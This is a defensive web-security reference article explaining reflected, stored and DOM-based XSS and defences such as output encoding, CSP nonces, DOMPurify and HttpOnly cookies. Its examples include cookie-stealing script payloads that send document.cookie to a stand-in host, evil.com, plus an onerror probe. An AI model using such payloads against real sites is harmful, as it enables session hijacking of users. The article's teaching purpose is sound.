---
title: "XSS"
description: "How reflected, stored, and DOM-based XSS attacks work, and the context-specific defences that stop them"
tags: [system-design, security, web]
draft: false
date: 2026-06-17
lastmod: 2026-06-17
---

Cross-Site Scripting (XSS) lets an attacker inject malicious scripts into a page viewed by other users. The browser executes the script in the context of the vulnerable site — same origin, same cookies, same DOM access — as if the code came from the site itself.

---

## Types

### Reflected XSS

The payload is in the request (typically a URL parameter) and reflected directly into the response. The server never stores it. Requires the victim to click a crafted link.

```
https://example.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>
```

If the server renders `q` into the HTML without encoding, the script executes in the victim's browser. Lower blast radius than stored XSS — one victim per crafted link — but still dangerous for session hijacking or phishing.

### Stored XSS

The payload is saved to the database and served to every user who views that content. No crafted link required — anyone visiting the page is affected, and the payload persists until removed.

```
# Attacker posts a comment:
Great article! <script>document.location='https://evil.com/steal?c='+document.cookie</script>

# Every user who loads the comments page executes the script
```

Stored XSS has a much larger blast radius than reflected. A payload in a high-traffic page (admin panel, public feed) can compromise every session that views it.

### DOM-based XSS

The payload never reaches the server. Client-side JavaScript reads attacker-controlled input and writes it to the DOM via a dangerous sink.

**Sources** (attacker-controlled input):
- `location.search`, `location.hash`, `location.href`
- `document.referrer`
- `window.name`, `postMessage` data

**Sinks** (dangerous DOM writes):
- `innerHTML`, `outerHTML`
- `document.write`, `document.writeln`
- `eval`, `setTimeout(string)`, `setInterval(string)`
- `location.href = attacker_input` (JavaScript URL)
- jQuery: `$(attacker_input)`, `.html(attacker_input)`

```js
// Vulnerable: reads hash directly into innerHTML
document.getElementById('output').innerHTML = location.hash.slice(1)

// Attacker URL: https://example.com/page#<img src=x onerror=alert(1)>
```

DOM XSS is invisible to server-side WAFs and security scanners that only inspect HTTP traffic.

---

## Context-Specific Output Encoding

**Output encoding is the primary defence.** The correct encoding depends entirely on where the data is rendered — using the wrong encoding for the context provides no protection.

| Context | Example | Required Encoding |
|---|---|---|
| HTML body | `<p>Hello, NAME</p>` | HTML entity encode (`<` → `&lt;`) |
| HTML attribute | `<input value="NAME">` | HTML attribute encode (quote and entity) |
| JavaScript string | `var name = "NAME";` | JavaScript string encode (`\` escaping) |
| URL parameter | `<a href="/search?q=NAME">` | URL percent-encode |
| CSS value | `color: NAME` | CSS hex encode |

HTML-encoding `<` as `&lt;` is correct in the HTML body. Inside a `<script>` block or an event attribute (`onclick="...NAME..."`), it does nothing useful — you need JavaScript encoding. A developer who learns "escape HTML" but not context-specific encoding will introduce XSS in non-HTML contexts.

---

## Framework Protections and Where They Fail

Modern frameworks escape output by default — but all provide escape hatches that bypass those protections. These escape hatches are where XSS lives in modern applications.

| Framework | Safe default | Dangerous bypass |
|---|---|---|
| React | JSX auto-escapes | `dangerouslySetInnerHTML={{ __html: input }}` |
| Vue | Template auto-escapes | `v-html="input"` |
| Angular | Template binding escapes | `[innerHTML]="input"` |
| Django | Template auto-escapes | `{{ value\|safe }}`, `mark_safe()` |
| Jinja2 | Auto-escapes (if enabled) | `{{ value\|safe }}`, `Markup(value)` |

Search your codebase for these before shipping. Each one is a potential XSS sink — they all require the input to be sanitised before use, not just validated.

---

## Content Security Policy (CSP)

CSP tells the browser which script sources are trusted, providing a second line of defence if encoding fails.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-r4nd0m'
```

A nonce is a random value generated per response and embedded in both the CSP header and each `<script>` tag. Only scripts with a matching nonce execute.

```html
<script nonce="r4nd0m">/* trusted inline script */</script>
```

**Common CSP mistakes that provide no protection:**

```http
# unsafe-inline allows arbitrary inline scripts — defeats XSS protection entirely
Content-Security-Policy: script-src 'self' 'unsafe-inline'

# script-src 'self' is insufficient if the site serves user-uploaded .js files
Content-Security-Policy: script-src 'self'

# A missing script-src falls back to default-src — check both
Content-Security-Policy: default-src 'none'  ← secure
```

CSP with `'unsafe-inline'` is common in legacy codebases that added CSP without refactoring inline scripts. It is not meaningfully protective against XSS.

---

## Sanitisation for Rich HTML Input

When users must submit HTML (rich text editors, markdown with HTML), sanitise with an allowlist-based library — never build your own parser.

**Use DOMPurify (browser) or equivalent server-side library:**

```js
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(userInput)
element.innerHTML = clean
```

**mXSS (mutation XSS):** browsers can "mutate" sanitised HTML during parsing — the serialised output of a sanitiser is re-parsed by the browser and can produce executable markup that the sanitiser never saw. DOMPurify accounts for this; custom sanitisers almost never do. Don't write a custom HTML sanitiser.

Blocklist approaches (strip `<script>`, reject `javascript:`) are consistently bypassable via encoding tricks, parser differentials, and novel HTML features. Use an allowlist: permit specific tags and attributes, deny everything else.

---

## HttpOnly Cookies

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
```

`HttpOnly` prevents JavaScript from reading the cookie via `document.cookie`. This removes session token theft as an XSS impact.

**What it doesn't prevent:** an attacker with XSS can still make authenticated requests on the user's behalf (same-origin XHR/fetch sends cookies automatically), modify account details, redirect the user, install a keylogger, or exfiltrate visible page content. `HttpOnly` reduces the impact of XSS; it does not prevent it.

---

## Defence Summary

| Defence | What it stops | Caveat |
|---|---|---|
| Context-aware output encoding | Injection into HTML/JS/URL/CSS | Must match the rendering context |
| Framework auto-escaping | Most template injection | Bypassed by `dangerouslySetInnerHTML`, `v-html`, etc. |
| DOMPurify sanitisation | Rich HTML input | Required when HTML must be allowed |
| CSP with nonces/hashes | Script execution if encoding fails | `unsafe-inline` negates protection |
| `HttpOnly` cookies | Cookie theft via `document.cookie` | Doesn't prevent other XSS impacts |
| Input validation | Supplementary — reduces noise | Cannot be the primary defence |

---

## When XSS Doesn't Apply

- **No user-controlled content rendered to any user** — if the page contains only static content with no dynamic values, there is no injection point
- **Native mobile apps** — XSS is a browser execution model; native apps don't have an equivalent (though WebView components do)
- **APIs returning JSON consumed by code, not a browser renderer** — JSON responses are not rendered as HTML; the consumer's rendering layer is where encoding must happen
